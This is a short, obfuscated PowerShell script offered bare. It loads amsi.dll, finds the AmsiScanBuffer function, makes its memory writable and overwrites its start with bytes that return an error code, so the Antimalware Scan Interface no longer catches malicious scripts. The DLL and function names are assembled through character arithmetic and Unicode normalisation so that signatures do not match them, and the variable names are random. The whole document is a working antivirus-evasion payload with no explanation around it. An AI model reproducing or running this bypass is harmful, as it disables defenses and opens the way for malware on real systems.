$qrjty = @"
using System;
using System.Runtime.InteropServices;
public class qrjty {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr hmwzpy, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $qrjty

$hklzscv = [qrjty]::LoadLibrary("$(('â'+'m'+'s'+'î'+'.'+'d'+'l'+'l').noRMalIze([ChaR]([bYtE]0x46)+[CHAr](71+40)+[chaR](114*36/36)+[cHAr](109)+[chAr](18+50)) -replace [cHar]([bYTE]0x5c)+[CHAr](112*43/43)+[CHar](123*76/76)+[CHAr](10+67)+[cHAR](110*81/81)+[CHaR]([Byte]0x7d))")
$frpddl = [qrjty]::GetProcAddress($hklzscv, "$([cHAR](65*49/49)+[char]([bYTE]0x6d)+[Char]([BYtE]0x73)+[cHAr](105)+[chAr](74+9)+[cHar](29+70)+[ChAR](42+55)+[CHAr](110+7-7)+[ChAR](49+17)+[CHar]([ByTE]0x75)+[ChaR]([BYte]0x66)+[chaR]([BytE]0x66)+[ChaR](101*97/97)+[cHar](114))")
$p = 0
[qrjty]::VirtualProtect($frpddl, [uint32]5, 0x40, [ref]$p)
$yeut = "0xB8"
$hrja = "0x57"
$drfu = "0x00"
$fygc = "0x07"
$jhug = "0x80"
$zrvp = "0xC3"
$tmzfm = [Byte[]] ($yeut,$hrja,$drfu,$fygc,+$jhug,+$zrvp)
[System.Runtime.InteropServices.Marshal]::Copy($tmzfm, 0, $frpddl, 6)